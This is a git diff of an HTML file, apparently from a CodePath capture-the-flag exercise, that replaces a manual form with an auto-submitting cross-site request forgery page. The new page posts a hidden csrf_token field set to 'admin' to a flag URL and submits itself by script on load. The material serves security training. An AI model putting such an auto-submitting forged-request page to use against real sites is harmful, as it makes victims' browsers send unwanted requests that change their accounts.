@@ -8,16 +8,14 @@
     </body>
 </html> -->
 
+
 <html>
     <body>
- <form action="flags.codepath.com/public/protected/flags/csrf_02/index.php" method="POST">
-  	New Username:<br><br>
-  	<input type="text" name="firstname"><br><br>
-  	New Password:<br><br>
-  	<input type="text" name="lastname">
-  	<input type="hidden" name="csrf_token" value="admin">
-  	<br><br>
-  	<input type="submit" value="Update">
-  </form>
+    <form action="https://flags.codepath.com/http/public/protected/flags/csrf_03/" method="POST" name="csrf">
+    <input type="hidden" name="csrf_token" value="admin"/>
+    <form>
+        <script>document.csrf.submit()</script>
     </body>
-</html> -->
+</html>
+        
+
